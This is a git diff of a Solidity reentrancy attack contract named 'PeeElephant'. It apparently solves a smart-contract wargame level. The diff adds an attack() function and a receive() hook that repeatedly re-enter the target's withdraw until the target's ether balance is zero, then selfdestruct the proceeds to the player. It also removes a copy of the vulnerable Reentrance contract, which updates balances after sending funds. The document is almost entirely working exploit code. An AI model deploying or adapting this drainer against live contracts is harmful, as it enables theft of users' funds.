@@ -1,20 +1,32 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "@openzeppelin/contracts/utils/math/SafeMath.sol";
+interface IReentrancy {
+    function withdraw(uint256) external;
+
+    function donate(address) external payable;
+}
 
 contract PeeElephant {
     address payable targetAddress;
-    Reentrance target;
+    IReentrancy target;
     address payable player;
+    uint256 myDeposit;
 
     constructor(address _target, address _player) payable {
         targetAddress = payable(_target);
-        target = Reentrance(targetAddress);
+        target = IReentrancy(targetAddress);
         player = payable(_player);
-        uint256 depositAmount = msg.value;
-        donatePwn();
-        target.withdraw(depositAmount);
+        myDeposit = msg.value;
+    }
+
+    function attack() external payable {
+        target.donate{value: myDeposit}(address(this));
+        target.withdraw(myDeposit);
+        uint256 totalDeposits = targetAddress.balance;
+
+        require(totalDeposits == 0, "target balance less than 0");
+        selfdestruct(player);
     }
 
     function withdrawEther() external returns (bool) {
@@ -25,49 +37,17 @@ contract PeeElephant {
         return sent;
     }
 
-    function donatePwn() public payable {
-        target.donate{value: msg.value}(address(this));
-    }
-
     receive() external payable {
         //get balance of contract
-        uint256 prize = address(targetAddress).balance;
-        uint256 myDeposit = target.balanceOf(address(this));
-        if (prize == 0) {
-            return;
-        }
-        if (prize < myDeposit) {
-            target.withdraw(prize);
-        }
-        if (prize >= myDeposit) {
-            target.withdraw(myDeposit);
-            player.transfer(address(this).balance);
-        }
-    }
-}
+        uint amount = min(myDeposit, targetAddress.balance);
 
-contract Reentrance {
-    using SafeMath for uint256;
-    mapping(address => uint) public balances;
-
-    function donate(address _to) public payable {
-        balances[_to] = balances[_to].add(msg.value);
-    }
-
-    function balanceOf(address _who) public view returns (uint balance) {
-        return balances[_who];
-    }
-
-    //lets call this function in our fallback function
-    function withdraw(uint _amount) public {
-        if (balances[msg.sender] >= _amount) {
-            (bool result, ) = msg.sender.call{value: _amount}("");
-            if (result) {
-                _amount;
-            } //this is not state-reverting error checkin, thats where this whole thing fucks up
-            balances[msg.sender] -= _amount;
+        if (targetAddress.balance > 0) {
+            target.withdraw(amount);
         }
     }
 
-    receive() external payable {}
+    function min(uint x, uint y) private pure returns (uint) {
+        uint amount = x <= y ? x : y;
+        return amount;
+    }
 }
